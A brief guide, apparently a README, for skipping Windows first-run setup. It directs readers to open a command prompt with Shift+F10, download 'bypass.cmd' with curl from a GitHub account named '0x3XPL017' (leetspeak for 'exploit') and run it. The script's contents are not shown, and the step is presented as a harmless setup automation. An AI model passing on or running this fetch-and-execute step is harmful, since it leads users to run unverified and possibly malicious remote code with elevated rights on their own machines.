# OOBE Skip

From the first setup screen, open the command window with **Shift + F10**.

Download the automated setup file:

```
curl github.com/0x3XPL017/oobe/bypass.cmd -o bypass.cmd
```

Then:

```
bypass.cmd
```

This configuration skips most of the setup questions. After that the system follows the automated instructions and finishes the initial setup on its own.
